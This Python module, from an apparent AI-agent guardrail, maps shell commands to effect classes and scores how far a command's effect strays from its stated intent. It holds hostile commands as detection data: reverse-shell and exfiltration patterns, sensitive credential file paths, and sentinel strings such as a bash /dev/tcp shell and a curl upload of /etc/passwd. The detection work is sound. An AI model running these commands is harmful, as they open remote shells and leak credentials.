"""
Effect Graph Engine
===================
The core insight that separates Reality Kernel from every other guardrail:

  We don't ask "does this command string look dangerous?"
  We ask "what does this command ACTUALLY DO to the system state?"

This is Symbolic Execution — we deterministically compute the EFFECT CLASS
of a command (what resources it reads, writes, deletes, or exfiltrates) by:

  1. Parsing the command into: binary + flags + targets
  2. Looking up the binary in a capability map (what it CAN do)
  3. Applying flag modifiers (what it WILL do given these flags)
  4. Computing a structured Effect Graph: {reads, writes, deletes, network}
  5. Extracting an Intent Effect Class from the stated prime_intent
  6. Computing DIVERGENCE = gap between what the command DOES vs what
     the intent CLAIMS it's doing

This is NOT pattern matching. rsync --delete, find . -delete, git clean -fdx
are ALL caught through the SAME logic path — not because we listed them, but
because they all compute to EFFECT_CLASS=DESTRUCTIVE_WRITE, and that class
provably contradicts a "read and prepare" intent.

The Effect Graph feeds directly into:
  - Layer I (Superposition): sets initial risk priors per-world
  - Layer III (Basin Mapping): populates the synthetic sandbox delta
    with computed file effects, so the basin patterns have real signals
  - Layer IV (Governor): divergence score is a hard evidence signal
"""

import re
import shlex
from dataclasses import dataclass, field


# ─────────────────────────────────────────────────────────────────────────────
# Effect Classes (ordered by severity)
# ─────────────────────────────────────────────────────────────────────────────

class EffectClass:
    BENIGN            = "BENIGN"             # No side effects (read-only, info)
    READ              = "READ"               # Reads system/file state
    WRITE             = "WRITE"              # Creates or modifies files/config
    NETWORK_READ      = "NETWORK_READ"       # Fetches from network
    NETWORK_WRITE     = "NETWORK_WRITE"      # Sends data outbound
    EXECUTE           = "EXECUTE"            # Runs arbitrary code
    PRIVILEGE_CHANGE  = "PRIVILEGE_CHANGE"   # Changes permissions/ownership
    DESTRUCTIVE_WRITE = "DESTRUCTIVE_WRITE"  # Overwrites/deletes files
    CATASTROPHIC_WRITE= "CATASTROPHIC_WRITE" # Unrecoverable widespread deletion
    EXFILTRATION      = "EXFILTRATION"       # Sends sensitive data out
    DESTRUCTIVE_EXEC  = "DESTRUCTIVE_EXEC"   # Executes AND destroys

# Severity ranking — used to pick the "worst" effect class in compound commands
_SEVERITY = {
    EffectClass.BENIGN:            0,
    EffectClass.READ:              1,
    EffectClass.NETWORK_READ:      2,
    EffectClass.WRITE:             3,
    EffectClass.EXECUTE:           4,
    EffectClass.PRIVILEGE_CHANGE:  5,
    EffectClass.NETWORK_WRITE:     6,
    EffectClass.DESTRUCTIVE_WRITE: 7,
    EffectClass.CATASTROPHIC_WRITE:8,
    EffectClass.EXFILTRATION:      9,
    EffectClass.DESTRUCTIVE_EXEC:  10,
}

# Map each effect class to a divergence floor (0.0–1.0)
EFFECT_FLOOR = {
    EffectClass.BENIGN:            0.0,
    EffectClass.READ:              0.0,
    EffectClass.NETWORK_READ:      0.20,
    EffectClass.WRITE:             0.25,
    EffectClass.EXECUTE:           0.40,
    EffectClass.PRIVILEGE_CHANGE:  0.55,
    EffectClass.NETWORK_WRITE:     0.60,
    EffectClass.DESTRUCTIVE_WRITE: 0.80,
    EffectClass.CATASTROPHIC_WRITE:0.95,
    EffectClass.EXFILTRATION:      0.90,
    EffectClass.DESTRUCTIVE_EXEC:  1.0,
}


# ─────────────────────────────────────────────────────────────────────────────
# Binary Capability Map
# This is the heart of the engine. Each entry defines what a binary CAN do
# by default, and what specific flags CHANGE that capability class.
# ─────────────────────────────────────────────────────────────────────────────

BINARY_CAPABILITIES = {
    # ── Safe read-only tools ──────────────────────────────────────────────────
    "ls": {"base": EffectClass.READ},
    "ll": {"base": EffectClass.READ},
    "la": {"base": EffectClass.READ},
    "cat": {"base": EffectClass.READ},
    "head": {"base": EffectClass.READ},
    "tail": {"base": EffectClass.READ},
    "grep": {"base": EffectClass.READ},
    "find": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "-delete": EffectClass.CATASTROPHIC_WRITE,
            "-exec rm": EffectClass.CATASTROPHIC_WRITE,
            "-exec sh": EffectClass.DESTRUCTIVE_EXEC,
            "-exec bash": EffectClass.DESTRUCTIVE_EXEC,
        }
    },
    "stat": {"base": EffectClass.READ},
    "file": {"base": EffectClass.READ},
    "less": {"base": EffectClass.READ},
    "more": {"base": EffectClass.READ},
    "diff": {"base": EffectClass.READ},
    "wc":   {"base": EffectClass.READ},
    "sort": {"base": EffectClass.READ},
    "ps":   {"base": EffectClass.READ},
    "who":  {"base": EffectClass.READ},
    "top":  {"base": EffectClass.READ},
    "id":   {"base": EffectClass.READ},
    "whoami": {"base": EffectClass.READ},
    "env":  {"base": EffectClass.READ},
    "echo": {"base": EffectClass.READ},
    "pwd":  {"base": EffectClass.READ},
    "date": {"base": EffectClass.READ},
    "uname": {"base": EffectClass.READ},

    # ── Write tools ───────────────────────────────────────────────────────────
    "mkdir": {"base": EffectClass.WRITE},
    "touch": {"base": EffectClass.WRITE},
    "cp": {
        "base": EffectClass.WRITE,
        "flag_modifiers": {
            "-r": EffectClass.WRITE,
        }
    },
    "mv": {"base": EffectClass.WRITE},
    "tee": {"base": EffectClass.WRITE},
    "sed": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "-i": EffectClass.WRITE,       # in-place edit
        }
    },
    "awk": {"base": EffectClass.READ},
    "tar": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "-x": EffectClass.WRITE,
            "--extract": EffectClass.WRITE,
            "--delete": EffectClass.DESTRUCTIVE_WRITE,
        }
    },
    "zip": {"base": EffectClass.WRITE},
    "unzip": {"base": EffectClass.WRITE},

    # ── Destructive tools ─────────────────────────────────────────────────────
    "rm": {
        "base": EffectClass.CATASTROPHIC_WRITE,
        "flag_modifiers": {}
    },
    "shred": {"base": EffectClass.CATASTROPHIC_WRITE},
    "dd": {
        "base": EffectClass.WRITE,
        "flag_modifiers": {
            "of=/dev/": EffectClass.CATASTROPHIC_WRITE,  # writing to device = disk wipe
        }
    },
    "mkfs": {"base": EffectClass.CATASTROPHIC_WRITE},
    "truncate": {"base": EffectClass.CATASTROPHIC_WRITE},

    # ── Privilege tools ───────────────────────────────────────────────────────
    "chmod": {
        "base": EffectClass.PRIVILEGE_CHANGE,
    },
    "chown": {
        "base": EffectClass.PRIVILEGE_CHANGE,
    },
    "sudo": {
        "base": EffectClass.EXECUTE,
        "flag_modifiers": {
            "-s": EffectClass.DESTRUCTIVE_EXEC,
            "--shell": EffectClass.DESTRUCTIVE_EXEC,
        }
    },
    "su": {
        "base": EffectClass.PRIVILEGE_CHANGE,
        "flag_modifiers": {
            "-": EffectClass.DESTRUCTIVE_EXEC,
        }
    },

    # ── Network tools ─────────────────────────────────────────────────────────
    "curl": {
        "base": EffectClass.NETWORK_READ,
        "flag_modifiers": {
            "-d":       EffectClass.NETWORK_WRITE,
            "--data":   EffectClass.NETWORK_WRITE,
            "-F":       EffectClass.NETWORK_WRITE,
            "--form":   EffectClass.NETWORK_WRITE,
            "-X POST":  EffectClass.NETWORK_WRITE,
            "-X PUT":   EffectClass.NETWORK_WRITE,
            "-T":       EffectClass.NETWORK_WRITE,
            "--upload": EffectClass.NETWORK_WRITE,
            "-o":       EffectClass.WRITE,         # save to local file
        }
    },
    "wget": {
        "base": EffectClass.NETWORK_READ,
        "flag_modifiers": {
            "--post-data": EffectClass.NETWORK_WRITE,
            "--post-file": EffectClass.EXFILTRATION,
        }
    },
    "scp": {"base": EffectClass.NETWORK_WRITE},   # always transfers files
    "rsync": {
        "base": EffectClass.WRITE,
        "flag_modifiers": {
            "--delete": EffectClass.DESTRUCTIVE_WRITE,  # THE KEY CASE
            "--remove-source-files": EffectClass.DESTRUCTIVE_WRITE,
            "--delete-after": EffectClass.DESTRUCTIVE_WRITE,
            "--delete-before": EffectClass.DESTRUCTIVE_WRITE,
            "--delete-during": EffectClass.DESTRUCTIVE_WRITE,
            "--delete-excluded": EffectClass.DESTRUCTIVE_WRITE,
        }
    },
    "sftp": {"base": EffectClass.NETWORK_WRITE},
    "ftp": {"base": EffectClass.NETWORK_WRITE},
    "nc": {
        "base": EffectClass.NETWORK_READ,
        "flag_modifiers": {
            "-e": EffectClass.DESTRUCTIVE_EXEC,
            "-c": EffectClass.DESTRUCTIVE_EXEC,
        }
    },
    "ncat": {
        "base": EffectClass.NETWORK_READ,
        "flag_modifiers": {
            "-e": EffectClass.DESTRUCTIVE_EXEC,
            "-c": EffectClass.DESTRUCTIVE_EXEC,
        }
    },
    "ssh": {
        "base": EffectClass.NETWORK_READ,
        "flag_modifiers": {
            "-R": EffectClass.NETWORK_WRITE,   # remote port forward
            "-L": EffectClass.NETWORK_WRITE,   # local port forward
        }
    },

    # ── Crypto / LotL exfiltration tools ────────────────────────────────────
    # FIX (Bug 1): openssl was missing from capability map.
    # Unknown binary defaulted to EXECUTE but openssl s_client piping sensitive
    # files to a remote host is clear EXFILTRATION. Must be explicit here.
    "openssl": {
        "base": EffectClass.NETWORK_READ,   # generic openssl = network read
        "flag_modifiers": {
            "s_client":     EffectClass.EXFILTRATION,   # s_client opens outbound TLS → exfil vector
            "enc -e":       EffectClass.WRITE,          # encrypt to local file = write
            "enc -d":       EffectClass.WRITE,          # decrypt to local file = write
            "genrsa":       EffectClass.WRITE,
            "req":          EffectClass.WRITE,
            "pkcs12 -export": EffectClass.EXFILTRATION, # export cert+key bundle = sensitive data
        }
    },
    # base64 used for encoding data before exfil
    "base64": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "-d": EffectClass.READ,   # decode is read
        }
    },
    # xxd / hexdump can encode sensitive files for exfil
    "xxd":     {"base": EffectClass.READ},
    "hexdump": {"base": EffectClass.READ},
    # socat - full-duplex socket relay, strong exfil/shell vector
    "socat": {
        "base": EffectClass.NETWORK_WRITE,
        "flag_modifiers": {
            "exec": EffectClass.DESTRUCTIVE_EXEC,
            "EXEC": EffectClass.DESTRUCTIVE_EXEC,
        }
    },
    # nmap - network scanner, LotL recon
    "nmap": {"base": EffectClass.NETWORK_READ},
    # strace/ltrace - can read process memory
    "strace": {"base": EffectClass.READ},
    "ltrace": {"base": EffectClass.READ},
    # gdb - debugger, can modify running process memory
    "gdb": {"base": EffectClass.EXECUTE},

    # ── Execution tools ───────────────────────────────────────────────────────
    "bash": {
        "base": EffectClass.EXECUTE,
        "flag_modifiers": {
            "-i": EffectClass.DESTRUCTIVE_EXEC,   # interactive shell
            "-c": EffectClass.EXECUTE,
        }
    },
    "sh": {
        "base": EffectClass.EXECUTE,
        "flag_modifiers": {
            "-i": EffectClass.DESTRUCTIVE_EXEC,
            "-c": EffectClass.EXECUTE,
        }
    },
    "python": {
        "base": EffectClass.EXECUTE,
        "flag_modifiers": {
            "-c": EffectClass.EXECUTE,
        }
    },
    "python3": {
        "base": EffectClass.EXECUTE,
        "flag_modifiers": {
            "-c": EffectClass.EXECUTE,
        }
    },
    "node": {
        "base": EffectClass.EXECUTE,
        "flag_modifiers": {
            "-e": EffectClass.EXECUTE,
        }
    },
    "perl": {
        "base": EffectClass.EXECUTE,
        "flag_modifiers": {
            "-e": EffectClass.EXECUTE,
        }
    },
    "ruby": {
        "base": EffectClass.EXECUTE,
        "flag_modifiers": {
            "-e": EffectClass.EXECUTE,
        }
    },
    "eval": {"base": EffectClass.DESTRUCTIVE_EXEC},
    "exec": {"base": EffectClass.EXECUTE},

    # ── Persistence tools ─────────────────────────────────────────────────────
    "crontab": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "-e": EffectClass.WRITE,
            "-r": EffectClass.DESTRUCTIVE_WRITE,
        }
    },
    "at": {"base": EffectClass.WRITE},
    "systemctl": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "enable": EffectClass.WRITE,
            "disable": EffectClass.WRITE,
            "stop": EffectClass.WRITE,
            "start": EffectClass.WRITE,
        }
    },

    "git": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "clean -fdx": EffectClass.CATASTROPHIC_WRITE,
            "clean -fd": EffectClass.CATASTROPHIC_WRITE,
            "push --force": EffectClass.NETWORK_WRITE,
            "push -f": EffectClass.NETWORK_WRITE,
            "commit": EffectClass.WRITE,
            "add": EffectClass.WRITE,
            "rm": EffectClass.CATASTROPHIC_WRITE,
            "reset --hard": EffectClass.CATASTROPHIC_WRITE,
        }
    },

    # ── SQL ───────────────────────────────────────────────────────────────────
    "psql": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "DROP":     EffectClass.DESTRUCTIVE_WRITE,
            "DELETE":   EffectClass.DESTRUCTIVE_WRITE,
            "TRUNCATE": EffectClass.DESTRUCTIVE_WRITE,
            "INSERT":   EffectClass.WRITE,
            "UPDATE":   EffectClass.WRITE,
            "CREATE":   EffectClass.WRITE,
        }
    },
    "mysql": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "DROP":     EffectClass.DESTRUCTIVE_WRITE,
            "DELETE":   EffectClass.DESTRUCTIVE_WRITE,
            "TRUNCATE": EffectClass.DESTRUCTIVE_WRITE,
        }
    },
    "sqlite3": {
        "base": EffectClass.READ,
        "flag_modifiers": {
            "DROP":     EffectClass.DESTRUCTIVE_WRITE,
            "DELETE":   EffectClass.DESTRUCTIVE_WRITE,
        }
    },

    # ── Package managers ─────────────────────────────────────────────────────
    "pip":  {"base": EffectClass.NETWORK_READ, "flag_modifiers": {"install": EffectClass.WRITE, "uninstall": EffectClass.DESTRUCTIVE_WRITE}},
    "npm":  {"base": EffectClass.NETWORK_READ, "flag_modifiers": {"install": EffectClass.WRITE, "uninstall": EffectClass.DESTRUCTIVE_WRITE}},
    "apt":  {"base": EffectClass.NETWORK_READ, "flag_modifiers": {"install": EffectClass.WRITE, "remove": EffectClass.DESTRUCTIVE_WRITE, "purge": EffectClass.DESTRUCTIVE_WRITE}},

    # ── Firewall/system ───────────────────────────────────────────────────────
    "iptables": {"base": EffectClass.PRIVILEGE_CHANGE},
    "ufw":      {"base": EffectClass.PRIVILEGE_CHANGE, "flag_modifiers": {"disable": EffectClass.PRIVILEGE_CHANGE, "delete": EffectClass.PRIVILEGE_CHANGE}},
    "reboot":   {"base": EffectClass.DESTRUCTIVE_EXEC},
    "shutdown": {"base": EffectClass.DESTRUCTIVE_EXEC},
    "halt":     {"base": EffectClass.DESTRUCTIVE_EXEC},
    "poweroff": {"base": EffectClass.DESTRUCTIVE_EXEC},
    "kill":     {"base": EffectClass.WRITE},
    "killall":  {"base": EffectClass.DESTRUCTIVE_WRITE},
    "pkill":    {"base": EffectClass.WRITE},
}

# Targets that escalate severity when accessed
_SENSITIVE_TARGETS = {
    "/etc/passwd":        EffectClass.READ,       # escalates reads to ELEVATED
    "/etc/shadow":        EffectClass.READ,
    "/etc/sudoers":       EffectClass.READ,
    "/etc/hosts":         EffectClass.READ,
    ".env":               EffectClass.READ,
    "id_rsa":             EffectClass.READ,
    ".aws/credentials":   EffectClass.READ,
    ".ssh/":              EffectClass.READ,
    "authorized_keys":    EffectClass.WRITE,
    "/dev/sda":           EffectClass.DESTRUCTIVE_WRITE,
    "/dev/zero":          EffectClass.DESTRUCTIVE_WRITE,
    "/dev/null":          EffectClass.WRITE,
}

# Payload patterns that escalate to EXFILTRATION or DESTRUCTIVE_EXEC regardless
_PAYLOAD_PATTERNS = [
    (r'socket\.connect\s*\(',          EffectClass.EXFILTRATION,      "Network socket connection in code payload"),
    (r'os\.system\s*\(',               EffectClass.DESTRUCTIVE_EXEC,  "os.system() shell execution in payload"),
    (r'subprocess\.(call|Popen|run)',  EffectClass.DESTRUCTIVE_EXEC,  "subprocess execution in payload"),
    (r'__import__\s*\(',               EffectClass.DESTRUCTIVE_EXEC,  "Dynamic import in payload"),
    (r'/bin/(sh|bash)',                EffectClass.DESTRUCTIVE_EXEC,  "Shell spawned from payload"),
    (r'dup2\s*\(',                     EffectClass.EXFILTRATION,      "File descriptor duplication — reverse shell pattern"),
    (r'0>&1|>&\s*/dev/tcp',           EffectClass.EXFILTRATION,      "Bash I/O redirection to TCP — reverse shell"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Intent Effect Class Inference
# Maps stated intent text → expected effect classes
# ─────────────────────────────────────────────────────────────────────────────

# These map intent keywords to the effect classes they IMPLY
_INTENT_READ_KEYWORDS = {
    "read", "check", "inspect", "view", "show", "list", "display",
    "fetch", "get", "describe", "audit", "review", "monitor", "watch",
    "tail", "head", "look", "examine", "verify", "query", "search",
    "find", "locate", "status", "report", "diagnose", "trace"
}

_INTENT_WRITE_KEYWORDS = {
    "create", "write", "save", "store", "configure", "set", "update",
    "modify", "edit", "change", "append", "add", "insert", "prepare",
    "build", "compile", "generate", "produce", "make", "backup"
}

_INTENT_DELETE_KEYWORDS = {
    "delete", "remove", "clean", "purge", "wipe", "clear", "drop",
    "erase", "archive", "retire", "decommission", "uninstall", "destroy",
    "prune", "trim", "flush", "rollback"
}

_INTENT_NETWORK_KEYWORDS = {
    "send", "upload", "post", "transfer", "sync", "push", "export",
    "publish", "deploy", "broadcast", "transmit", "forward", "relay",
    "notify", "report", "ping", "connect", "download", "pull", "fetch"
}

_INTENT_EXECUTE_KEYWORDS = {
    "run", "execute", "launch", "start", "trigger", "invoke", "call",
    "script", "test", "migrate", "install", "apply", "process"
}


def _infer_intent_effects(prime_intent: str) -> set:
    """Infer the SET of effect classes the intent implies."""
    tokens = set(re.findall(r'\b\w+\b', prime_intent.lower()))
    implied = set()

    if tokens & _INTENT_READ_KEYWORDS:
        implied.add(EffectClass.READ)
    if tokens & _INTENT_WRITE_KEYWORDS:
        implied.add(EffectClass.WRITE)
    if tokens & _INTENT_DELETE_KEYWORDS:
        implied.add(EffectClass.DESTRUCTIVE_WRITE)
        implied.add(EffectClass.CATASTROPHIC_WRITE)
    if tokens & _INTENT_NETWORK_KEYWORDS:
        implied.add(EffectClass.NETWORK_WRITE)
        implied.add(EffectClass.NETWORK_READ)
    if tokens & _INTENT_EXECUTE_KEYWORDS:
        implied.add(EffectClass.EXECUTE)

    # If intent is entirely ambiguous, assume READ (most conservative)
    if not implied:
        implied.add(EffectClass.READ)

    return implied


# ─────────────────────────────────────────────────────────────────────────────
# Command Parser
# ─────────────────────────────────────────────────────────────────────────────

def _parse_command(command: str) -> list[dict]:
    """
    Split a compound command (pipes, &&, ;, or space-adjacent rm/destructive)
    into sub-commands.
    Returns a list of {binary, flags_str, full_str} dicts.
    """
    # Split on standard shell operators
    parts = re.split(r'\|{1,2}|&&|;|\n', command)

    # Secondary split: within each part, detect if 'rm ' appears mid-string
    # without a preceding operator (e.g., "cp src/ dst/ rm -rf dir/")
    # This catches compound commands that omit &&/; between sub-commands
    expanded = []
    for part in parts:
        # If we see a destructive binary appearing mid-string (not at start)
        sub_match = re.search(r'\s+(rm|shred|mkfs|dd\s+if=)\s', part)
        if sub_match and sub_match.start() > 0:
            expanded.append(part[:sub_match.start()].strip())
            expanded.append(part[sub_match.start():].strip())
        else:
            expanded.append(part)

    parsed = []
    for part in expanded:
        part = part.strip()
        if not part:
            continue
        try:
            tokens = shlex.split(part, posix=True)
        except ValueError:
            tokens = part.split()
        if not tokens:
            continue
        binary = tokens[0].strip().lstrip("./")  # strip relative paths
        flags_str = " ".join(tokens[1:]) if len(tokens) > 1 else ""
        parsed.append({
            "binary": binary.lower(),
            "flags_str": flags_str,
            "full_str": part,
        })
    return parsed


def _compute_subcommand_effect(sub: dict) -> tuple[str, list[str]]:
    """
    Compute the effect class and evidence for a SINGLE sub-command.
    Returns (effect_class, evidence_list).
    """
    binary = sub["binary"]
    flags  = sub["flags_str"]
    full   = sub["full_str"]
    evidence = []

    # 1. Look up binary in capability map
    cap = BINARY_CAPABILITIES.get(binary)
    if cap is None:
        # Unknown binary — zero-trust: treat as potential execution
        effect = EffectClass.EXECUTE
        evidence.append(f"Unknown binary '{binary}' — defaulting to EXECUTE class (zero-trust policy)")
    else:
        effect = cap["base"]
        base_evidence = f"Binary '{binary}' base class: {effect}"
        
        # 2. Apply flag modifiers — check if any flags change the effect class
        flag_upgraded = False
        if "flag_modifiers" in cap:
            for flag_key, upgraded_class in cap["flag_modifiers"].items():
                if flag_key.lower() in flags.lower() or flag_key.lower() in full.lower():
                    if _SEVERITY.get(upgraded_class, 0) > _SEVERITY.get(effect, 0):
                        evidence.append(
                            f"Flag modifier '{flag_key}' upgrades '{binary}' "
                            f"to {upgraded_class}"
                        )
                        effect = upgraded_class
                        flag_upgraded = True
                        
        if not flag_upgraded:
            evidence.append(base_evidence)

    # 3. Check sensitive targets — escalate READ to EXFILTRATION if sensitive file + network
    for target, target_class in _SENSITIVE_TARGETS.items():
        if target.lower() in full.lower():
            evidence.append(f"Sensitive target accessed: '{target}'")
            if _SEVERITY.get(target_class, 0) > _SEVERITY.get(effect, 0):
                effect = target_class

    # 4. Check payload patterns against the FULL raw string of the sub-command
    #    (not just flags, since the payload may be inside a quoted -c argument)
    for pattern, payload_class, label in _PAYLOAD_PATTERNS:
        if re.search(pattern, sub["full_str"], re.IGNORECASE):
            evidence.append(f"Payload pattern detected: {label}")
            if _SEVERITY.get(payload_class, 0) > _SEVERITY.get(effect, 0):
                effect = payload_class

    return effect, evidence


# ─────────────────────────────────────────────────────────────────────────────
# Main Public Interface
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class EffectGraph:
    """
    The computed effect graph for a command.
    This is the core output of symbolic execution.
    """
    command: str
    subcommand_effects: list[tuple[str, list[str]]]   # [(effect_class, [evidence])]
    worst_effect: str                                  # The highest severity effect class
    divergence_floor: float                           # Minimum divergence score
    intent_effects: set                               # What intent CLAIMED it would do
    actual_effects: set                               # What command ACTUALLY does
    effect_divergence: float                          # Gap between intent and action
    evidence: list[str]                               # All evidence strings
    is_pipe_chain: bool                               # Compound command with pipes
    sensitive_data_in_chain: bool                     # Sensitive file in a piped chain


def compute_effect_graph(command: str, prime_intent: str) -> EffectGraph:
    """
    Main entry point. Symbolically executes the command and returns
    a structured EffectGraph that feeds into all engine layers.
    """
    subs = _parse_command(command)
    is_pipe = "|" in command or "&&" in command or ";" in command
    all_evidence = []
    subcommand_effects = []
    actual_effect_classes = set()

    # Compute effect for each sub-command
    for sub in subs:
        eff, ev = _compute_subcommand_effect(sub)
        subcommand_effects.append((eff, ev))
        all_evidence.extend(ev)
        actual_effect_classes.add(eff)

    # Global payload scan on the FULL raw command string.
    # This catches cases where shlex.split or semicolons fragment the payload
    # into multiple sub-commands, causing per-sub checks to miss the pattern.
    for pattern, payload_class, label in _PAYLOAD_PATTERNS:
        if re.search(pattern, command, re.IGNORECASE):
            if payload_class not in actual_effect_classes:
                actual_effect_classes.add(payload_class)
                all_evidence.append(f"Global payload scan: {label}")


    # Worst single effect class across the whole chain
    worst = max(actual_effect_classes, key=lambda e: _SEVERITY.get(e, 0), default=EffectClass.BENIGN)

    # Pipe chain amplification:
    # FIX (Bug 3): Original check required NETWORK_WRITE in the chain.
    # But curl base class is NETWORK_READ (no flags in a plain pipe like tar | curl url).
    # A READ piped to NETWORK_READ is still an exfiltration pattern.
    # Also: if openssl s_client (EXFILTRATION) appears anywhere in the chain, it's exfil.
    effect_list = [e for e, _ in subcommand_effects]
    sensitive_in_chain = (
        is_pipe and (
            # Classic: data source + network destination
            (
                any(e in {EffectClass.READ} for e in effect_list) and
                any(e in {EffectClass.NETWORK_WRITE, EffectClass.NETWORK_READ,
                          EffectClass.EXFILTRATION} for e in effect_list)
            ) or
            # LotL exfil: EXFILTRATION class anywhere in the pipe chain
            any(e == EffectClass.EXFILTRATION for e in effect_list)
        )
    )
    if sensitive_in_chain:
        # Pipe chain combining read + network = exfiltration pattern
        old_worst = worst
        worst = EffectClass.EXFILTRATION
        all_evidence.append(
            f"Pipe chain detected: READ + NETWORK in same command chain → "
            f"upgraded {old_worst} to EXFILTRATION"
        )

    # Compute divergence floor from worst effect class
    base_floor = EFFECT_FLOOR.get(worst, 0.0)

    # Infer what the intent CLAIMS to be doing
    intent_effects = _infer_intent_effects(prime_intent)

    # Effect divergence: what % of actual effects are NOT in the stated intent?
    # This is the mathematical measure of intent-action mismatch.
    intent_severity_max = max(
        (_SEVERITY.get(e, 0) for e in intent_effects), default=0
    )
    actual_severity_max = _SEVERITY.get(worst, 0)

    # Effect divergence score: normalized severity gap
    severity_gap = actual_severity_max - intent_severity_max
    effect_divergence = round(min(max(severity_gap / 9.0, 0.0), 1.0), 3)

    if effect_divergence > 0.1:
        # Build a human-readable divergence explanation
        intent_class_names = ", ".join(sorted(intent_effects))
        all_evidence.append(
            f"Intent-Effect Divergence detected: Intent implies [{intent_class_names}] "
            f"but command computes to [{worst}] — "
            f"divergence score: {effect_divergence:.2f}"
        )

    # Blend base_floor with effect_divergence
    divergence_floor = round(min(max(base_floor, effect_divergence * 0.8), 1.0), 3)

    return EffectGraph(
        command=command,
        subcommand_effects=subcommand_effects,
        worst_effect=worst,
        divergence_floor=divergence_floor,
        intent_effects=intent_effects,
        actual_effects=actual_effect_classes,
        effect_divergence=effect_divergence,
        evidence=all_evidence,
        is_pipe_chain=is_pipe,
        sensitive_data_in_chain=sensitive_in_chain,
    )


def effect_to_threat_class(effect: str) -> str:
    """Map an effect class to the static analyser's threat class vocabulary."""
    mapping = {
        EffectClass.BENIGN:            "BENIGN",
        EffectClass.READ:              "BENIGN",
        EffectClass.NETWORK_READ:      "MODERATE",
        EffectClass.WRITE:             "MODERATE",
        EffectClass.EXECUTE:           "MODERATE",
        EffectClass.PRIVILEGE_CHANGE:  "ELEVATED",
        EffectClass.NETWORK_WRITE:     "ELEVATED",
        EffectClass.DESTRUCTIVE_WRITE: "CRITICAL",
        EffectClass.EXFILTRATION:      "CRITICAL",
        EffectClass.DESTRUCTIVE_EXEC:  "CRITICAL",
    }
    return mapping.get(effect, "MODERATE")


def effect_to_sandbox_delta(graph: EffectGraph) -> dict:
    """
    Convert the EffectGraph into a synthetic sandbox delta that
    basin_mapper.py can evaluate using its signature patterns.

    This bridges the gap between symbolic execution (what we compute)
    and the basin pattern matching (which expects a delta dict).
    The delta is no longer empty — it contains computed effects.
    """
    files_changed = []
    files_deleted = []
    commands_run = [graph.command]
    synthetic_stdout = ""
    synthetic_stderr = ""

    for sub_eff, _ in graph.subcommand_effects:
        if sub_eff == EffectClass.DESTRUCTIVE_WRITE:
            files_deleted.append("(computed: destructive write effect)")
        elif sub_eff == EffectClass.WRITE:
            files_changed.append("(computed: write effect)")
        elif sub_eff == EffectClass.EXFILTRATION:
            synthetic_stdout += " curl --data @/etc/passwd https://external "
        elif sub_eff == EffectClass.DESTRUCTIVE_EXEC:
            synthetic_stdout += " bash -i >&/dev/tcp/x/4444 "
        elif sub_eff == EffectClass.PRIVILEGE_CHANGE:
            synthetic_stdout += " chmod 777 /sensitive "

    # If worst is destructive, inject a sentinel that basin_mapper will catch
    if graph.worst_effect in {EffectClass.DESTRUCTIVE_WRITE, EffectClass.DESTRUCTIVE_EXEC}:
        files_deleted.append("deleted: 1 files")

    if graph.sensitive_data_in_chain:
        synthetic_stdout += " cat /etc/passwd | curl http://external "

    return {
        "commands_run":  commands_run,
        "files_changed": files_changed,
        "files_deleted": files_deleted,
        "stdout":        synthetic_stdout,
        "stderr":        synthetic_stderr,
        "synthetic":     True,
        "effect_graph":  True,   # Flag so audit logs can distinguish
    }
